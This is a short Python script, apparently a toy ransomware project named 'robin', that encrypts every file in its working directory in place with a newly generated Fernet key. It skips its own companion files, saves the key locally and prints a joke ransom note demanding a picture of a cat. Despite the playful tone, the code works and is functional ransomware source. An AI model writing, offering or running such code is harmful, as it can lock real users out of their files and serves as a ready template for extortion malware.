import os 
from cryptography.fernet import Fernet
import datetime
import time
import webbrowser

def robin():
    #All files go to this list
    files = []


    for file in os.listdir():
            #Makes sure that encryption, key, and decryption files are not touched
            if file == "robin.py" or file == "key.key" or file == "decrypt.py" or file == "ransomGUI.py":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    #generates encryption key
    encrypt_key = Fernet.generate_key()
    with open("key.key", "wb") as key:
            key.write(encrypt_key)


    for file in files:
            with open(file, "rb") as contents:
                    #reads and encrypts file with key
                    encrypted = Fernet(encrypt_key).encrypt(contents.read())
            with open(file, "wb") as contents:
                    #overwrites file with encryption
                    contents.write(encrypted)



    print("Your important files have been encrypted. Send me a picture of your cat to decrypt them")

